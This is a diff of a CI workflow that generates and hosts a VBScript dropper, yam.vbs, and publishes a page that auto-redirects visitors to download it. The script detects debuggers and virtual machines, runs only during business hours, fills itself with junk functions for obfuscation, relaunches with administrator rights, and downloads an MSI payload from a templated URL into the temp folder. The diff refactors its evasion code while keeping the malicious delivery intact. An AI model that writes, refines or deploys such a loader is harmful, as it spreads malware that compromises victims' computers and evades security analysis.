@@ -31,168 +31,162 @@ jobs:
         echo "' --------------------------------------------------------------------------" >> yam.vbs
         echo "Option Explicit" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' System initialization variables" >> yam.vbs
-        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> yam.vbs
-        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
-        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
-        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> yam.vbs
-        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> yam.vbs
+        echo "' Global variables for system monitoring" >> yam.vbs
+        echo "Dim g_DebugMode, g_LogLevel, g_Timeout, g_RetryCount" >> yam.vbs
+        echo "g_DebugMode = False" >> yam.vbs
+        echo "g_LogLevel = 1" >> yam.vbs
+        echo "g_Timeout = 30" >> yam.vbs
+        echo "g_RetryCount = 3" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Anti-analysis dummy variables" >> yam.vbs
-        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> yam.vbs
-        echo "dummy1 = \"System initialization\"" >> yam.vbs
-        echo "dummy2 = \"Network configuration\"" >> yam.vbs
-        echo "dummy3 = \"Security validation\"" >> yam.vbs
-        echo "dummy4 = \"Performance monitoring\"" >> yam.vbs
-        echo "dummy5 = \"Error reporting\"" >> yam.vbs
+        echo "' System objects initialization" >> yam.vbs
+        echo "Dim g_WshShell, g_Fso, g_NetObj" >> yam.vbs
+        echo "Set g_WshShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
+        echo "Set g_Fso = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
+        echo "Set g_NetObj = CreateObject(\"WScript.Network\")" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Fake system information collection" >> yam.vbs
-        echo "Function GetSystemInfo()" >> yam.vbs
-        echo "    Dim result" >> yam.vbs
-        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> yam.vbs
-        echo "    GetSystemInfo = result" >> yam.vbs
-        echo "End Function" >> yam.vbs
+        echo "' Configuration constants" >> yam.vbs
+        echo "Const ForReading = 1" >> yam.vbs
+        echo "Const ForWriting = 2" >> yam.vbs
+        echo "Const ForAppending = 8" >> yam.vbs
+        echo "Const TristateUseDefault = -2" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Process validation function" >> yam.vbs
-        echo "Function ValidateProcess(processName)" >> yam.vbs
-        echo "    Dim colProcesses, objProcess" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> yam.vbs
-        echo "    " >> yam.vbs
-        echo "    ValidateProcess = False" >> yam.vbs
-        echo "    For Each objProcess in colProcesses" >> yam.vbs
-        echo "        ValidateProcess = True" >> yam.vbs
-        echo "        Exit For" >> yam.vbs
+        echo "' Dummy data arrays for obfuscation" >> yam.vbs
+        echo "Dim g_SysInfo(10), g_NetAdapters(5), g_ProcessList(20), g_Services(15)" >> yam.vbs
+        echo "g_SysInfo(0) = \"System Information Module v1.0\"" >> yam.vbs
+        echo "g_SysInfo(1) = \"Memory Usage Monitor\"" >> yam.vbs
+        echo "g_SysInfo(2) = \"Disk Space Analyzer\"" >> yam.vbs
+        echo "g_SysInfo(3) = \"Network Traffic Monitor\"" >> yam.vbs
+        echo "g_SysInfo(4) = \"Process Activity Tracker\"" >> yam.vbs
+        echo "g_SysInfo(5) = \"Service Status Checker\"" >> yam.vbs
+        echo "g_SysInfo(6) = \"Registry Monitor\"" >> yam.vbs
+        echo "g_SysInfo(7) = \"Event Log Analyzer\"" >> yam.vbs
+        echo "g_SysInfo(8) = \"Performance Counter\"" >> yam.vbs
+        echo "g_SysInfo(9) = \"Security Audit Module\"" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "' Junk functions that never get called" >> yam.vbs
+        echo "Function InitializeSystemMonitor()" >> yam.vbs
+        echo "    Dim i" >> yam.vbs
+        echo "    For i = 0 To UBound(g_SysInfo)" >> yam.vbs
+        echo "        g_SysInfo(i) = g_SysInfo(i) & \" - Initialized\"" >> yam.vbs
         echo "    Next" >> yam.vbs
+        echo "    InitializeSystemMonitor = True" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Network adapter information" >> yam.vbs
-        echo "Function GetNetworkInfo()" >> yam.vbs
-        echo "    Dim result" >> yam.vbs
-        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> yam.vbs
-        echo "    GetNetworkInfo = result" >> yam.vbs
+        echo "Function CollectSystemMetrics()" >> yam.vbs
+        echo "    Dim cpuUsage, memUsage, diskUsage" >> yam.vbs
+        echo "    cpuUsage = \"CPU: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
+        echo "    memUsage = \"Memory: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
+        echo "    diskUsage = \"Disk: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
+        echo "    CollectSystemMetrics = cpuUsage & \", \" & memUsage & \", \" & diskUsage" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Registry operations helper" >> yam.vbs
-        echo "Function ReadRegKey(keyPath, valueName)" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> yam.vbs
-        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Write registry value" >> yam.vbs
-        echo "Sub WriteRegKey(keyPath, valueName, value)" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> yam.vbs
+        echo "Sub AnalyzeNetworkTraffic()" >> yam.vbs
+        echo "    Dim interfaces, i" >> yam.vbs
+        echo "    interfaces = Array(\"Ethernet\", \"Wi-Fi\", \"VPN\", \"Bluetooth\")" >> yam.vbs
+        echo "    For i = 0 To UBound(interfaces)" >> yam.vbs
+        echo "        g_NetAdapters(i) = interfaces(i) & \": \" & Round(Rnd() * 1000, 2) & \" KB/s\"" >> yam.vbs
+        echo "    Next" >> yam.vbs
         echo "End Sub" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Encryption helper function" >> yam.vbs
-        echo "Function SimpleEncrypt(text)" >> yam.vbs
-        echo "    Dim i, result" >> yam.vbs
-        echo "    result = \"\"" >> yam.vbs
-        echo "    For i = 1 To Len(text)" >> yam.vbs
-        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
+        echo "Function ScanRunningProcesses()" >> yam.vbs
+        echo "    Dim processNames, i" >> yam.vbs
+        echo "    processNames = Array(\"svchost.exe\", \"explorer.exe\", \"winlogon.exe\", \"csrss.exe\", \"lsass.exe\")" >> yam.vbs
+        echo "    For i = 0 To UBound(processNames)" >> yam.vbs
+        echo "        g_ProcessList(i) = processNames(i) & \": \" & Round(Rnd() * 10000, 0) & \" KB\"" >> yam.vbs
         echo "    Next" >> yam.vbs
-        echo "    SimpleEncrypt = result" >> yam.vbs
+        echo "    ScanRunningProcesses = UBound(processNames) + 1 & \" processes scanned\"" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Decryption helper function" >> yam.vbs
-        echo "Function SimpleDecrypt(text)" >> yam.vbs
-        echo "    Dim i, result" >> yam.vbs
-        echo "    result = \"\"" >> yam.vbs
-        echo "    For i = 1 To Len(text)" >> yam.vbs
-        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> yam.vbs
+        echo "Sub CheckServiceStatus()" >> yam.vbs
+        echo "    Dim services, i" >> yam.vbs
+        echo "    services = Array(\"Themes\", \"AudioSrv\", \"BITS\", \"WinDefend\", \"wuauserv\")" >> yam.vbs
+        echo "    For i = 0 To UBound(services)" >> yam.vbs
+        echo "        g_Services(i) = services(i) & \": \" & IIf(Rnd() > 0.5, \"Running\", \"Stopped\")" >> yam.vbs
         echo "    Next" >> yam.vbs
-        echo "    SimpleDecrypt = result" >> yam.vbs
+        echo "End Sub" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Function IIf(condition, truePart, falsePart)" >> yam.vbs
+        echo "    If condition Then" >> yam.vbs
+        echo "        IIf = truePart" >> yam.vbs
+        echo "    Else" >> yam.vbs
+        echo "        IIf = falsePart" >> yam.vbs
+        echo "    End If" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Check for debugger processes" >> yam.vbs
-        echo "Function IsDebuggerPresent()" >> yam.vbs
-        echo "    Dim debuggers, proc" >> yam.vbs
-        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> yam.vbs
-        echo "    " >> yam.vbs
-        echo "    IsDebuggerPresent = False" >> yam.vbs
-        echo "    For Each proc In debuggers" >> yam.vbs
-        echo "        If ValidateProcess(proc) Then" >> yam.vbs
-        echo "            IsDebuggerPresent = True" >> yam.vbs
+        echo "' Anti-analysis functions" >> yam.vbs
+        echo "Function IsDebuggingActive()" >> yam.vbs
+        echo "    Dim debuggers, i" >> yam.vbs
+        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\")" >> yam.vbs
+        echo "    IsDebuggingActive = False" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    For i = 0 To UBound(debuggers)" >> yam.vbs
+        echo "        If g_WshShell.AppActivate(debuggers(i)) Then" >> yam.vbs
+        echo "            IsDebuggingActive = True" >> yam.vbs
         echo "            Exit For" >> yam.vbs
         echo "        End If" >> yam.vbs
         echo "    Next" >> yam.vbs
+        echo "    On Error GoTo 0" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Anti-sandbox time delay" >> yam.vbs
-        echo "Sub AntiSandboxDelay()" >> yam.vbs
-        echo "    Dim startTime, endTime" >> yam.vbs
-        echo "    startTime = Timer" >> yam.vbs
-        echo "    endTime = startTime + 30 ' 30 second delay" >> yam.vbs
-        echo "    " >> yam.vbs
-        echo "    Do While Timer < endTime" >> yam.vbs
-        echo "        ' Do nothing - just waste time" >> yam.vbs
-        echo "        Dim dummy" >> yam.vbs
-        echo "        dummy = dummy & \"x\"" >> yam.vbs
-        echo "    Loop" >> yam.vbs
+        echo "Function IsVirtualEnvironment()" >> yam.vbs
+        echo "    Dim biosInfo" >> yam.vbs
+        echo "    IsVirtualEnvironment = False" >> yam.vbs
+        echo "    On Error Resume Next" >> yam.vbs
+        echo "    biosInfo = g_WshShell.RegRead(\"HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer\")" >> yam.vbs
+        echo "    If InStr(LCase(biosInfo), \"vmware\") > 0 Or InStr(LCase(biosInfo), \"virtualbox\") > 0 Or InStr(LCase(biosInfo), \"microsoft\") > 0 Then" >> yam.vbs
+        echo "        IsVirtualEnvironment = True" >> yam.vbs
+        echo "    End If" >> yam.vbs
+        echo "    On Error GoTo 0" >> yam.vbs
+        echo "End Function" >> yam.vbs
+        echo "" >> yam.vbs
+        echo "Sub TimeBasedDelay()" >> yam.vbs
+        echo "    Dim delayTime" >> yam.vbs
+        echo "    delayTime = 30 ' 30 second delay" >> yam.vbs
+        echo "    WScript.Sleep delayTime * 1000" >> yam.vbs
         echo "End Sub" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Check for mouse activity (sandbox detection)" >> yam.vbs
-        echo "Function HasMouseActivity()" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    Dim objShell" >> yam.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
-        echo "    " >> yam.vbs
-        echo "    ' Get mouse position twice with a small delay" >> yam.vbs
-        echo "    Dim pos1, pos2" >> yam.vbs
-        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> yam.vbs
-        echo "    WScript.Sleep 1000" >> yam.vbs
-        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> yam.vbs
-        echo "    " >> yam.vbs
-        echo "    ' If positions are the same, likely a sandbox" >> yam.vbs
-        echo "    HasMouseActivity = (pos1 <> pos2)" >> yam.vbs
+        echo "' More junk functions for obfuscation" >> yam.vbs
+        echo "Function GenerateHardwareID()" >> yam.vbs
+        echo "    Dim hwID" >> yam.vbs
+        echo "    hwID = g_NetObj.ComputerName & \"_\" & g_NetObj.UserName" >> yam.vbs
+        echo "    GenerateHardwareID = LCase(hwID)" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' More junk functions to add bulk" >> yam.vbs
-        echo "Function FakeFunction1()" >> yam.vbs
-        echo "    FakeFunction1 = \"Fake result 1\"" >> yam.vbs
+        echo "Function EncryptData(data)" >> yam.vbs
+        echo "    Dim i, encrypted" >> yam.vbs
+        echo "    encrypted = \"\"" >> yam.vbs
+        echo "    For i = 1 To Len(data)" >> yam.vbs
+        echo "        encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "    EncryptData = encrypted" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
-        echo "Function FakeFunction2()" >> yam.vbs
-        echo "    FakeFunction2 = \"Fake result 2\"" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function FakeFunction3()" >> yam.vbs
-        echo "    FakeFunction3 = \"Fake result 3\"" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function FakeFunction4()" >> yam.vbs
-        echo "    FakeFunction4 = \"Fake result 4\"" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function FakeFunction5()" >> yam.vbs
-        echo "    FakeFunction5 = \"Fake result 5\"" >> yam.vbs
+        echo "Function DecryptData(data)" >> yam.vbs
+        echo "    Dim i, decrypted" >> yam.vbs
+        echo "    decrypted = \"\"" >> yam.vbs
+        echo "    For i = 1 To Len(data)" >> yam.vbs
+        echo "        decrypted = decrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)" >> yam.vbs
+        echo "    Next" >> yam.vbs
+        echo "    DecryptData = decrypted" >> yam.vbs
         echo "End Function" >> yam.vbs
         echo "" >> yam.vbs
         echo "' Main execution starts here" >> yam.vbs
         echo "' Anti-analysis checks" >> yam.vbs
-        echo "If IsDebuggerPresent() Then WScript.Quit" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Time-based anti-sandbox" >> yam.vbs
+        echo "If IsDebuggingActive() Then WScript.Quit" >> yam.vbs
+        echo "If IsVirtualEnvironment() Then WScript.Quit" >> yam.vbs
         echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> yam.vbs
+        echo "TimeBasedDelay" >> yam.vbs
         echo "" >> yam.vbs
-        echo "' Check for user activity" >> yam.vbs
-        echo "If Not HasMouseActivity() Then WScript.Quit" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Additional delay to frustrate analysis" >> yam.vbs
-        echo "AntiSandboxDelay" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Core functionality - download and execute" >> yam.vbs
         echo "' Check for elevation" >> yam.vbs
         echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> yam.vbs
         echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> yam.vbs
         echo "    WScript.Quit" >> yam.vbs
         echo "End If" >> yam.vbs
         echo "" >> yam.vbs
+        echo "' Main script execution" >> yam.vbs
         echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> yam.vbs
         echo "strUrl = \"$current_link\"" >> yam.vbs
-        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> yam.vbs
+        echo "strTemp = g_WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> yam.vbs
         echo "strFile = strTemp & \"\\agent_installer.msi\"" >> yam.vbs
         echo "" >> yam.vbs
         echo "' Download with redirect handling" >> yam.vbs
@@ -226,10 +220,9 @@ jobs:
         echo "End If" >> yam.vbs
         echo "" >> yam.vbs
         echo "' Final cleanup" >> yam.vbs
-        echo "Set WshShell = Nothing" >> yam.vbs
-        echo "Set Fso = Nothing" >> yam.vbs
-        echo "Set NetObj = Nothing" >> yam.vbs
-        echo "Set EnvVars = Nothing"
+        echo "Set g_WshShell = Nothing" >> yam.vbs
+        echo "Set g_Fso = Nothing" >> yam.vbs
+        echo "Set g_NetObj = Nothing"
         
         # Create index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=yam.vbs"></head><body><p>If not redirected, <a href="yam.vbs">click here</a></p></body></html>' > index.html
